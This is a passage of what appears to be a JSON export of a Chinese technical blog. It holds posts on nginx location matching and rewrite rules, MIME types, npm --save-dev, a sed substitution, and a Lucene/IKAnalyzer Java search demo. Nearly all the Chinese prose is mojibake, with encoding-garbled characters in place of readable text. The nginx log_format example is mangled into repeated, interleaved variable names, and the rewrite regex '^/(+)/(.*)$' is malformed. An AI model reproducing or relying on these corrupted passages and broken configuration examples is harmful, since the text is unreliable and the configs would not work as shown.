ï¼Œå› æ­¤è¯·æ±‚ä¸º/static/20%/aaaï¼Œå¯ä»¥è¢«è§„åˆ™^~ /static/ /aaaåŒ¹é…åˆ°ï¼ˆæ³¨æ„æ˜¯ç©ºæ ¼ï¼‰ã€‚å’Œ* å¼€å¤´è¡¨ç¤ºåŒºåˆ†å¤§å°å†™çš„å’Œä¸åŒºåˆ†å¤§å°å†™çš„æ­£åˆ™åŒ¹é…ã€‚!å’Œ!* å¼€å¤´è¡¨ç¤ºåŒºåˆ†å¤§å°å†™ä¸åŒ¹é…åŠä¸åŒºåˆ†å¤§å°å†™ä¸åŒ¹é…çš„æ­£åˆ™åŒ¹é…ã€‚/ é€šç”¨åŒ¹é…ï¼Œä»»ä½•è¯·æ±‚éƒ½ä¼šåŒ¹é…ï¼Œé€šå¸¸æ”¾ç€é…ç½®çš„æœ€åã€‚åŒ¹é…ä¼˜å…ˆçº§ï¼š(1). ä¼˜å…ˆå°è¯• å…¨åŒ¹é…( ä¹Ÿå°±æ˜¯å‰ç¼€ =)(2). å°è¯• è·¯å¾„åŒ¹é… ï¼ˆ ä¹Ÿå°±æ˜¯å‰ç¼€ ^~ï¼‰(3). å°è¯• æ­£åˆ™åŒ¹é… ï¼ˆ ä¹Ÿå°±æ˜¯å‰ç¼€ ~* æˆ–è€… ~ï¼‰(4). å­—ç¬¦ä¸²åŒ¹é… ï¼ˆä¹Ÿå°±æ˜¯å‰ç¼€ä¸ºç©ºï¼‰æ‰€ä»¥ï¼Œå‰ç¼€çš„ä¼˜å…ˆçº§æ¦‚æ‹¬ä¸ºï¼š= &gt; ^~ &gt; ~, ~* &gt; ç©ºå…¨åŒ¹é… &gt; è·¯å¾„åŒ¹é… &gt; æ­£åˆ™åŒ¹é… &gt; å­—ç¬¦ä¸²åŒ¹é…ç¤ºä¾‹ï¼š å­—ç¬¦ä¸²åŒ¹é…location /static {alias /home/www/static;access_log off;} è·¯å¾„åŒ¹é…ï¼Œæ­¤æ—¶proxy_passçš„ç»“æŸ / å†³å®šæ˜¯å¦å¸¦ä¸ŠåŒ¹é…çš„è·¯å¾„location ^~ /333/ {proxy_pass http://106.185.48.229/;} æ­£åˆ™åŒ¹é…ï¼Œæ­¤æ—¶proxy_passä¸èƒ½å¸¦ç»“æŸ /location ~ ^/(xxx|yyy)/ {proxy_pass http://106.185.48.229;} å­—ç¬¦ä¸²åŒ¹é…ï¼Œæ­¤æ—¶proxy_passçš„ç»“æŸ / å†³å®šæ˜¯å¦å¸¦ä¸ŠåŒ¹é…å¾—è·¯å¾„location /zzz/ {proxy_pass http://106.185.48.229/;} é»˜è®¤åŒ¹é…location / {proxy_pass http://127.0.0.1:8080;}äºŒã€Nginxçš„Rewriteè§„åˆ™è¯­æ³•è§„åˆ™ï¼šrewrite æ­£åˆ™ æ›¿æ¢ æ ‡å¿—ä½rewriteæŒ‡ä»¤çš„æœ€åä¸€é¡¹å‚æ•°ä¸ºflagæ ‡è®°ï¼Œflagæ ‡è®°æœ‰ï¼š1.last lastæ˜¯ç»ˆæ­¢å½“å‰locationçš„rewriteæ£€æµ‹,ä½†ä¼šç»§ç»­é‡è¯•locationåŒ¹é…å¹¶å¤„ç†åŒºå—ä¸­çš„rewriteè§„åˆ™ã€‚2.break breakæ˜¯ç»ˆæ­¢å½“å‰locationçš„rewriteæ£€æµ‹,è€Œä¸”ä¸å†è¿›è¡ŒlocationåŒ¹é…ã€‚3.redirect è¿”å›302ä¸´æ—¶é‡å®šå‘ï¼Œæµè§ˆå™¨åœ°å€ä¼šæ˜¾ç¤ºè·³è½¬åçš„URLåœ°å€ã€‚4.permanent è¿”å›301æ°¸ä¹…é‡å®šå‘ï¼Œæµè§ˆå™¨åœ°å€ä¼šæ˜¾ç¤ºè·³è½¬åçš„URLåœ°å€ã€‚ç¤ºä¾‹ï¼š æ­£åˆ™åŒ¹é… location ~ ^/(a|bb|ccc)/ { rewrite ^/(+)/(.*)$ http://106.185.48.229/$2?$1; } # æ³¨ï¼šç”¨æ‹¬å·æ‹¬èµ·æ¥çš„å‚æ•°ä¸ºåé¢çš„ $1 $2 å˜é‡ ä¸‰ã€Nginxå¸¸ç”¨è®¾ç½®1.ä¸ºäº†ä¾¿äºæ—¥å¿—ç»Ÿè®¡å’Œåˆ†æï¼Œå¤‡æ³¨ä¸€ä¸ªæ—¥å¿—ç¤ºä¾‹æ ¼å¼ï¼Œä¾›å‚è€ƒlog_format main â€˜timeiso8601âˆ£time_iso8601|timeâ€‹iâ€‹â€‹so8601âˆ£remote_addr|remoteuserâˆ£remote_user|remoteâ€‹uâ€‹â€‹serâˆ£request_method|uriâˆ£â€²â€²uri|&#x27; &#x27;uriâˆ£â€‹â€²â€²â€‹â€‹status|requesttimeâˆ£request_time|requestâ€‹tâ€‹â€‹imeâˆ£request_length|bodybytessentâˆ£body_bytes_sent|bodyâ€‹bâ€‹â€‹ytesâ€‹sâ€‹â€‹entâˆ£bytes_sent|â€™â€˜connectionâˆ£connection|connectionâˆ£http_x_forwarded_for|upstreamaddrâˆ£upstream_addr|upstreamâ€‹aâ€‹â€‹ddrâˆ£upstream_status|â€™â€˜upstreamresponsetimeâˆ£upstream_response_time|upstreamâ€‹râ€‹â€‹esponseâ€‹tâ€‹â€‹imeâˆ£args|httprefererâˆ£http_referer|httpâ€‹râ€‹â€‹efererâˆ£http_user_agentâ€™;access_log logs/access.log main;2. åå‘ä»£ç†é€ä¼ å®¢æˆ·ç«¯IPè®¾ç½®proxy_set_header Host $http_host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;3.å¸¸ç”¨çš„Nginxå…¨å±€å˜é‡$args #è¿™ä¸ªå˜é‡ç­‰äºè¯·æ±‚è¡Œä¸­çš„å‚æ•°ã€‚$content_length #è¯·æ±‚å¤´ä¸­çš„Content-lengthå­—æ®µã€‚$content_type #è¯·æ±‚å¤´ä¸­çš„Content-Typeå­—æ®µã€‚$document_root #å½“å‰è¯·æ±‚åœ¨rootæŒ‡ä»¤ä¸­æŒ‡å®šçš„å€¼ã€‚$host #è¯·æ±‚ä¸»æœºå¤´å­—æ®µï¼Œå¦åˆ™ä¸ºæœåŠ¡å™¨åç§°ã€‚$http_user_agent #å®¢æˆ·ç«¯agentä¿¡æ¯$http_cookie #å®¢æˆ·ç«¯cookieä¿¡æ¯$limit_rate #è¿™ä¸ªå˜é‡å¯ä»¥é™åˆ¶è¿æ¥é€Ÿç‡ã€‚$request_body_file #å®¢æˆ·ç«¯è¯·æ±‚ä¸»ä½“ä¿¡æ¯çš„ä¸´æ—¶æ–‡ä»¶åã€‚$request_method #å®¢æˆ·ç«¯è¯·æ±‚çš„åŠ¨ä½œï¼Œé€šå¸¸ä¸ºGETæˆ–POSTã€‚$remote_addr #å®¢æˆ·ç«¯çš„IPåœ°å€ã€‚$remote_port #å®¢æˆ·ç«¯çš„ç«¯å£ã€‚$remote_user #å·²ç»ç»è¿‡Auth Basic ModuleéªŒè¯çš„ç”¨æˆ·åã€‚$request_filename #å½“å‰è¯·æ±‚çš„æ–‡ä»¶è·¯å¾„ï¼Œç”±rootæˆ–aliasæŒ‡ä»¤ä¸URIè¯·æ±‚ç”Ÿæˆã€‚query_string #ä¸argsç›¸åŒã€‚$scheme #HTTPæ–¹æ³•ï¼ˆå¦‚httpï¼Œhttpsï¼‰ã€‚$server_protocol #è¯·æ±‚ä½¿ç”¨çš„åè®®ï¼Œé€šå¸¸æ˜¯HTTP/1.0æˆ–HTTP/1.1ã€‚$server_addr #æœåŠ¡å™¨åœ°å€ï¼Œåœ¨å®Œæˆä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨åå¯ä»¥ç¡®å®šè¿™ä¸ªå€¼ã€‚$server_name #æœåŠ¡å™¨åç§°ã€‚$server_port #è¯·æ±‚åˆ°è¾¾æœåŠ¡å™¨çš„ç«¯å£å·ã€‚$request_uri #åŒ…å«è¯·æ±‚å‚æ•°çš„åŸå§‹URIï¼Œä¸åŒ…å«ä¸»æœºåï¼Œå¦‚ï¼šâ€/foo/bar.php?arg=bazâ€ã€‚uri #ä¸å¸¦è¯·æ±‚å‚æ•°çš„å½“å‰URIï¼Œuriä¸åŒ…å«ä¸»æœºåï¼Œå¦‚â€/foo/bar.htmlâ€ã€‚document_uri #ä¸uriç›¸åŒã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nginx","slug":"nginx","permalink":"https://wangxiuwen.github.io/tags/nginx/"}],"author":"wangxiuwen"},{"title":"mimeç±»å‹","slug":"history/tech/5953c4d0c2b92f5665eed9ea","date":"2016-01-06T18:27:45.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9ea/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9ea/","excerpt":"","text":"MIMEæ˜¯æœåŠ¡å™¨é€šçŸ¥å®¢æˆ·æœºä¼ é€æ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹çš„ä¸»è¦æ–¹æ³•ï¼Œå®¢æˆ·æœºæµè§ˆå™¨ä¹Ÿé€šè¿‡MIMEå‘Šè¯‰æœåŠ¡å™¨å®ƒçš„å‚æ•°ã€‚ åœ¨ç½‘ä¸Šï¼Œå¦‚æœæ¥æ”¶åˆ°çš„æ–‡ä»¶æ²¡æœ‰MIMEå¤´ï¼Œå°±é»˜è®¤å®ƒä¸ºHTMLæ ¼å¼ã€‚ä½†è¿™æ ·ä¹Ÿä¸å¥½ï¼Œå› ä¸ºå½“MIMEçš„åŒ…å¤´æ˜¯text/plainæ—¶ï¼Œæµè§ˆå™¨å°†ç›´æ¥æ˜¾ç¤ºè€Œä¸å…³å¿ƒå®ƒçš„ä»€ä¹ˆå­—ä½“ï¼Œé¢œè‰²ä¹‹ç±»çš„å‚æ•°éœ€è¦äº†è§£çš„æ¦‚å¿µ Content-Typeï¼šç”¨äºå®šä¹‰ç”¨æˆ·çš„æµè§ˆå™¨æˆ–ç›¸å…³è®¾å¤‡å¦‚ä½•æ˜¾ç¤ºå°†è¦åŠ è½½çš„æ•°æ®ï¼Œæˆ–è€…å¦‚ä½•å¤„ç†å°†è¦åŠ è½½çš„æ•°æ® MIMEï¼šMIMEç±»å‹å°±æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚text/htmlçš„æ„æ€æ˜¯å°†æ–‡ä»¶çš„content-typeè®¾ç½®ä¸ºtext/htmlçš„å½¢å¼ï¼Œæµè§ˆå™¨åœ¨è·å–åˆ°è¿™ç§æ–‡ä»¶æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨htmlçš„è§£æå™¨å¯¹æ–‡ä»¶è¿›è¡Œç›¸åº”çš„å¤„ç†ã€‚text/plainçš„æ„æ€æ˜¯å°†æ–‡ä»¶è®¾ç½®ä¸ºçº¯æ–‡æœ¬çš„å½¢å¼ï¼Œæµè§ˆå™¨åœ¨è·å–åˆ°è¿™ç§æ–‡ä»¶æ—¶å¹¶ä¸ä¼šå¯¹å…¶è¿›è¡Œå¤„ç†ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"javascript","slug":"javascript","permalink":"https://wangxiuwen.github.io/tags/javascript/"}],"author":"wangxiuwen"},{"title":"save-dev","slug":"history/tech/5953c4d0c2b92f5665eed9e7","date":"2016-01-06T03:05:45.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9e7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9e7/","excerpt":"","text":"å½“ä½ ä¸ºä½ çš„æ¨¡å—å®‰è£…ä¸€ä¸ªä¾èµ–æ¨¡å—æ—¶ï¼Œæ­£å¸¸æƒ…å†µä¸‹ä½ å¾—å…ˆå®‰è£…ä»–ä»¬ï¼ˆåœ¨æ¨¡å—æ ¹ç›®å½•ä¸‹npm install module-nameï¼‰ï¼Œç„¶åè¿åŒç‰ˆæœ¬å·æ‰‹åŠ¨å°†ä»–ä»¬æ·»åŠ åˆ°æ¨¡å—é…ç½®æ–‡ä»¶package.jsonä¸­çš„ä¾èµ–é‡Œï¼ˆdependenciesï¼‰ã€‚-saveå’Œsave-devå¯ä»¥çœæ‰ä½ æ‰‹åŠ¨ä¿®æ”¹package.jsonæ–‡ä»¶çš„æ­¥éª¤ã€‚spm install module-name -save è‡ªåŠ¨æŠŠæ¨¡å—å’Œç‰ˆæœ¬å·æ·»åŠ åˆ°dependencieséƒ¨åˆ†spm install module-name -save-dev è‡ªåŠ¨æŠŠæ¨¡å—å’Œç‰ˆæœ¬å·æ·»åŠ åˆ°devdependencieséƒ¨åˆ†","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"linux æ–‡æœ¬æ›¿æ¢","slug":"history/tech/5953c4d0c2b92f5665eed9e6","date":"2016-01-06T03:02:20.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9e6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9e6/","excerpt":"","text":"sed -i â€˜s/åŸæ–‡/è¦æ›¿æ¢çš„æ–‡æœ¬/gâ€™ æ–‡ä»¶","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"Luceneä½¿ç”¨IKAnalyzeråˆ†è¯å®ä¾‹ åŠ IKAnalyzeræ‰©å±•è¯åº“","slug":"history/tech/5953c4d0c2b92f5665eed9e4","date":"2016-01-05T02:10:13.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9e4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9e4/","excerpt":"","text":"Luceneä½¿ç”¨IKAnalyzeråˆ†è¯å®ä¾‹ åŠ IKAnalyzeræ‰©å±•è¯åº“æ–¹æ¡ˆä¸€: åŸºäºé…ç½®çš„è¯å…¸æ‰©å……é¡¹ç›®ç»“æ„å›¾å¦‚ä¸‹:Luceneä½¿ç”¨IKAnalyzeråˆ†è¯å®ä¾‹ åŠ IKAnalyzeræ‰©å±•è¯åº“ - åªæœ‰ä»£ç æ‰èƒ½æ°¸æ’ - é¢¨ãƒ˜èˆè€…IKåˆ†è¯å™¨è¿˜æ”¯æŒé€šè¿‡é…ç½®IKAnalyzer.cfg.xmlæ–‡ä»¶æ¥æ‰©å……æ‚¨çš„ä¸“æœ‰è¯å…¸ã€‚è°·æ­Œæ‹¼éŸ³è¯åº“ä¸‹è½½: http://ishare.iask.sina.com.cn/f/14446921.html?from=likeåœ¨webé¡¹ç›®çš„srcç›®å½•ä¸‹åˆ›å»ºIKAnalyzer.cfg.xmlæ–‡ä»¶,å†…å®¹å¦‚ä¸‹ &lt;comment&gt;IK Analyzer æ‰©å±•é…ç½®&lt;/comment&gt; &lt;!-- ç”¨æˆ·å¯ä»¥åœ¨è¿™é‡Œé…ç½®è‡ªå·±çš„æ‰©å±•å­—å…¸ --&gt; &lt;entry key=&quot;ext_dict&quot;&gt;/dicdata/use.dic.dic;/dicdata/googlepy.dic&lt;/entry&gt; &lt;!-- ç”¨æˆ·å¯ä»¥åœ¨è¿™é‡Œé…ç½®è‡ªå·±çš„æ‰©å±•åœæ­¢è¯å­—å…¸ --&gt; &lt;entry key=&quot;ext_stopwords&quot;&gt;/dicdata/ext_stopword.dic&lt;/entry&gt; è¯å…¸æ–‡ä»¶çš„ç¼–è¾‘ä¸éƒ¨ç½² åˆ†è¯å™¨çš„è¯å…¸æ–‡ä»¶æ ¼å¼æ˜¯æ— BOM çš„UTF-8 ç¼–ç çš„ä¸­æ–‡æ–‡æœ¬æ–‡ä»¶ï¼Œæ–‡ä»¶æ‰©å±•åä¸é™ã€‚è¯å…¸ä¸­ï¼Œæ¯ä¸ªä¸­æ–‡è¯æ±‡ç‹¬ç«‹å ä¸€è¡Œï¼Œä½¿ç”¨\\r\\n çš„DOS æ–¹å¼æ¢è¡Œã€‚ï¼ˆæ³¨ï¼Œå¦‚æœæ‚¨ä¸äº†è§£ä»€ä¹ˆæ˜¯æ— BOM çš„UTF-8 æ ¼å¼ï¼Œ è¯·ä¿è¯æ‚¨çš„è¯å…¸ä½¿ç”¨UTF-8 å­˜å‚¨ï¼Œå¹¶åœ¨æ–‡ä»¶çš„å¤´éƒ¨æ·»åŠ ä¸€ç©ºè¡Œï¼‰ã€‚æ‚¨å¯ä»¥å‚è€ƒåˆ†è¯å™¨æºç org.wltea.analyzer.dic åŒ…ä¸‹çš„.dic æ–‡ä»¶ã€‚è¯å…¸æ–‡ä»¶åº”éƒ¨ç½²åœ¨Java çš„èµ„æºè·¯å¾„ä¸‹ï¼Œå³ClassLoader èƒ½å¤ŸåŠ è½½çš„è·¯å¾„ä¸­ã€‚ï¼ˆæ¨èåŒIKAnalyzer.cfg.xml æ”¾åœ¨ä¸€èµ·ï¼‰.æ–¹æ¡ˆäºŒ:åŸºäºAPIçš„è¯å…¸æ‰©å……åœ¨IKAnalyzerçš„ä¸è¯æ¡ç›¸å…³çš„æ“ä½œ1.org.wltea.analyzer.cfg2.org.wltea.analyzer.dicorg.wltea.analyzer.cfgä¸‹Configurationæ¥å£ä¸­çš„å®šä¹‰getExtDictionarys() è·å–æ‰©å±•å­—å…¸é…ç½®è·¯å¾„getExtStopWordDictionarys() è·å–æ‰©å±•åœæ­¢è¯å…¸é…ç½®è·¯å¾„getMainDictionary() è·å–ä¸»è¯å…¸è·¯å¾„getQuantifierDicionary() è·å–é‡è¯è¯å…¸è·¯å¾„org.wltea.analyzer.cfg.DefualtConfigç±»æ˜¯å¯¹Configurationæ¥å£çš„å®ç°org.wltea.analyzer.dicä¸‹çš„Directoryç±»ä¸­ç›¸å…³çš„æ–¹æ³•public void addWords(java.util.Collection&lt;java.lang.String&gt; words) æ‰¹é‡åŠ è½½æ–°è¯æ¡ å‚æ•°ï¼šwords - Collectionè¯æ¡åˆ—è¡¨public void disableWords(java.util.Collection&lt;java.lang.String&gt; words) æ‰¹é‡ç§»é™¤ï¼ˆå±è”½ï¼‰è¯æ¡Luceneä¸­ä½¿ç”¨IKAnalyzeråˆ†è¯å™¨å®ä¾‹æ¼”ç¤ºä¸šåŠ¡å®ä½“package com.icrate.service.study.demo;/****@version ï¼š 1.0@author ï¼š è‹è‹¥å¹´ å‘é€é‚®ä»¶@since ï¼š 1.0 åˆ›å»ºæ—¶é—´: 2013-4-7 ä¸‹åˆ01:52:49@functionï¼š TODO*/public class Medicine {private Integer id; private String name; private String function; public Medicine() { } public Medicine(Integer id, String name, String function) { super(); this.id = id; this.name = name; this.function = function; } //getter and setter() public String toString(){ return this.id + &quot;,&quot; +this.name + &quot;,&quot; + this.function; } }æ„å»ºæ¨¡æ‹Ÿæ•°æ®package com.icrate.service.study.demo;import java.util.ArrayList;import java.util.List;/****@version ï¼š 1.0@author ï¼š è‹è‹¥å¹´ å‘é€é‚®ä»¶@since ï¼š 1.0 åˆ›å»ºæ—¶é—´: 2013-4-7 ä¸‹åˆ01:54:34@functionï¼š TODO*/public class DataFactory {private static DataFactory dataFactory = new DataFactory(); private DataFactory(){ } public List&lt;Medicine&gt; getData(){ List&lt;Medicine&gt; list = new ArrayList&lt;Medicine&gt;(); list.add(new Medicine(1,&quot;é“¶èŠ± æ„Ÿå†’é¢—ç²’&quot;,&quot;åŠŸèƒ½ä¸»æ²»ï¼šé“¶èŠ±æ„Ÿå†’é¢—ç²’ ï¼Œå¤´ç—›,æ¸…çƒ­ï¼Œè§£è¡¨ï¼Œåˆ©å’½ã€‚&quot;)); list.add(new Medicine(2,&quot;æ„Ÿå†’ æ­¢å’³ç³–æµ†&quot;,&quot;åŠŸèƒ½ä¸»æ²»ï¼šæ„Ÿå†’æ­¢å’³ç³–æµ†,è§£è¡¨æ¸…çƒ­ï¼Œæ­¢å’³åŒ–ç—°ã€‚&quot;)); list.add(new Medicine(3,&quot;æ„Ÿå†’çµé¢—ç²’&quot;,&quot;åŠŸèƒ½ä¸»æ²»ï¼šè§£çƒ­é•‡ç—›ã€‚å¤´ç—› ,æ¸…çƒ­ã€‚&quot;)); list.add(new Medicine(4,&quot;æ„Ÿå†’çµèƒ¶å›Š&quot;,&quot;åŠŸèƒ½ä¸»æ²»ï¼šé“¶èŠ±æ„Ÿå†’é¢—ç²’ ï¼Œå¤´ç—›,æ¸…çƒ­ï¼Œè§£è¡¨ï¼Œåˆ©å’½ã€‚&quot;)); list.add(new Medicine(5,&quot;ä»å’Œ æ„Ÿå†’é¢—ç²’&quot;,&quot;åŠŸèƒ½ä¸»æ²»ï¼šç–é£æ¸…çƒ­ï¼Œå®£è‚ºæ­¢å’³,è§£è¡¨æ¸…çƒ­ï¼Œæ­¢å’³åŒ–ç—°ã€‚&quot;)); return list; } public static DataFactory getInstance(){ return dataFactory; } }ä½¿ç”¨Luceneå¯¹æ¨¡æ‹Ÿæ•°æ®è¿›è¡Œæ£€ç´¢package com.icrate.service.study.demo;import java.io.File;import java.io.IOException;import java.util.ArrayList;import java.util.List;import org.apache.lucene.analysis.Analyzer;import org.apache.lucene.document.Document;import org.apache.lucene.document.Field;import org.apache.lucene.index.IndexReader;import org.apache.lucene.index.IndexWriter;import org.apache.lucene.index.IndexWriterConfig;import org.apache.lucene.index.Term;import org.apache.lucene.queryParser.MultiFieldQueryParser;import org.apache.lucene.search.IndexSearcher;import org.apache.lucene.search.Query;import org.apache.lucene.search.ScoreDoc;import org.apache.lucene.search.TopDocs;import org.apache.lucene.search.highlight.Formatter;import org.apache.lucene.search.highlight.Fragmenter;import org.apache.lucene.search.highlight.Highlighter;import org.apache.lucene.search.highlight.QueryScorer;import org.apache.lucene.search.highlight.Scorer;import org.apache.lucene.search.highlight.SimpleFragmenter;import org.apache.lucene.search.highlight.SimpleHTMLFormatter;import org.apache.lucene.store.Directory;import org.apache.lucene.store.FSDirectory;import org.apache.lucene.util.Version;import org.wltea.analyzer.lucene.IKAnalyzer;/***LuenceProcess.java@version ï¼š 1.1@author ï¼š è‹è‹¥å¹´ å‘é€é‚®ä»¶@since ï¼š 1.0 åˆ›å»ºæ—¶é—´: Apr 3, 2013 11:48:11 AMTODO : Luenceä¸­ä½¿ç”¨IKåˆ†è¯å™¨*/public class LuceneIKUtil {private Directory directory ; private Analyzer analyzer ; /** * å¸¦å‚æ•°æ„é€ ,å‚æ•°ç”¨æ¥æŒ‡å®šç´¢å¼•æ–‡ä»¶ç›®å½• * @param indexFilePath */ public LuceneIKUtil(String indexFilePath){ try { directory = FSDirectory.open(new File(indexFilePath)); analyzer = new IKAnalyzer(); } catch (IOException e) { e.printStackTrace(); } } /** * é»˜è®¤æ„é€ ,ä½¿ç”¨ç³»ç»Ÿé»˜è®¤çš„è·¯å¾„ä½œä¸ºç´¢å¼• */ public LuceneIKUtil(){ this(&quot;/luence/index&quot;); } /** * åˆ›å»ºç´¢å¼• * Descriptionï¼š * @author dennisit@163.com Apr 3, 2013 * @throws Exception */ public void createIndex()throws Exception{ IndexWriterConfig indexWriterConfig = new IndexWriterConfig(Version.LUCENE_35,analyzer); IndexWriter indexWriter = new IndexWriter(directory,indexWriterConfig); indexWriter.deleteAll(); List&lt;Medicine&gt; list = DataFactory.getInstance().getData(); for(int i=0; i&lt;list.size(); i++){ Medicine medicine = list.get(i); Document document = addDocument(medicine.getId(), medicine.getName(), medicine.getFunction()); indexWriter.addDocument(document); } indexWriter.close(); } /** * * Descriptionï¼š * @author dennisit@163.com Apr 3, 2013 * @param id * @param title * @param content * @return */ public Document addDocument(Integer id, String name, String function){ Document doc = new Document(); //Field.Index.NO è¡¨ç¤ºä¸ç´¢å¼• //Field.Index.ANALYZED è¡¨ç¤ºåˆ†è¯ä¸”ç´¢å¼• //Field.Index.NOT_ANALYZED è¡¨ç¤ºä¸åˆ†è¯ä¸”ç´¢å¼• doc.add(new Field(&quot;id&quot;,String.valueOf(id),Field.Store.YES,Field.Index.NOT_ANALYZED)); doc.add(new Field(&quot;name&quot;,name,Field.Store.YES,Field.Index.ANALYZED)); doc.add(new Field(&quot;function&quot;,function,Field.Store.YES,Field.Index.ANALYZED)); return doc; } /** * * Descriptionï¼š æ›´æ–°ç´¢å¼• * @author dennisit@163.com Apr 3, 2013 * @param id * @param title * @param content */ public void update(Integer id,String title, String content){ try { IndexWriterConfig indexWriterConfig = new IndexWriterConfig(Version.LUCENE_35,analyzer); IndexWriter indexWriter = new IndexWriter(directory,indexWriterConfig); Document document = addDocument(id, title, content); Term term = new Term(&quot;id&quot;,String.valueOf(id)); indexWriter.updateDocument(term, document); indexWriter.close(); } catch (Exception e) { e.printStackTrace(); } } /** * * Descriptionï¼šæŒ‰ç…§IDè¿›è¡Œç´¢å¼• * @author dennisit@163.com Apr 3, 2013 * @param id */ public void delete(Integer id){ try { IndexWriterConfig indexWriterConfig = new IndexWriterConfig(Version.LUCENE_35,analyzer); IndexWriter indexWriter = new IndexWriter(directory,indexWriterConfig); Term term = new Term(&quot;id&quot;,String.valueOf(id)); indexWriter.deleteDocuments(term); indexWriter.close(); } catch (Exception e) { e.printStackTrace(); } } /** * * Descriptionï¼šæŸ¥è¯¢ * @author dennisit@163.com Apr 3, 2013 * @param where æŸ¥è¯¢æ¡ä»¶ * @param scoreDoc åˆ†é¡µæ—¶ç”¨ */ public List&lt;Medicine&gt; search(String[] fields,String keyword){ IndexSearcher indexSearcher = null; List&lt;Medicine&gt; result = new ArrayList&lt;Medicine&gt;(); try { //åˆ›å»ºç´¢å¼•æœç´¢å™¨,ä¸”åªè¯» IndexReader indexReader = IndexReader.open(directory,true); indexSearcher = new IndexSearcher(indexReader); MultiFieldQueryParser queryParser =new MultiFieldQueryParser(Version.LUCENE_35, fields,analyzer); Query query = queryParser.parse(keyword); //è¿”å›å‰numberæ¡è®°å½• TopDocs topDocs = indexSearcher.search(query, 10); //ä¿¡æ¯å±•ç¤º int totalCount = topDocs.totalHits; System.out.println(&quot;å…±æ£€ç´¢å‡º &quot;+totalCount+&quot; æ¡è®°å½•&quot;); //é«˜äº®æ˜¾ç¤º /* åˆ›å»ºé«˜äº®å™¨,ä½¿æœç´¢çš„ç»“æœé«˜äº®æ˜¾ç¤º SimpleHTMLFormatterï¼šç”¨æ¥æ§åˆ¶ä½ è¦åŠ äº®çš„å…³é”®å­—çš„é«˜äº®æ–¹å¼ æ­¤ç±»æœ‰2ä¸ªæ„é€ æ–¹æ³• 1ï¼šSimpleHTMLFormatter()é»˜è®¤çš„æ„é€ æ–¹æ³•.åŠ äº®æ–¹å¼ï¼š&lt;B&gt;å…³é”®å­—&lt;/B&gt; 2ï¼šSimpleHTMLFormatter(String preTag, String postTag).åŠ äº®æ–¹å¼ï¼špreTagå…³é”®å­—postTag */ Formatter formatter = new SimpleHTMLFormatter(&quot;&lt;font color='red'&gt;&quot;,&quot;&lt;/font&gt;&quot;); /* QueryScorer QueryScorer æ˜¯å†…ç½®çš„è®¡åˆ†å™¨ã€‚è®¡åˆ†å™¨çš„å·¥ä½œé¦–å…ˆæ˜¯å°†ç‰‡æ®µæ’åºã€‚QueryScorerä½¿ç”¨çš„é¡¹æ˜¯ä»ç”¨æˆ·è¾“å…¥çš„æŸ¥è¯¢ä¸­å¾—åˆ°çš„ï¼› 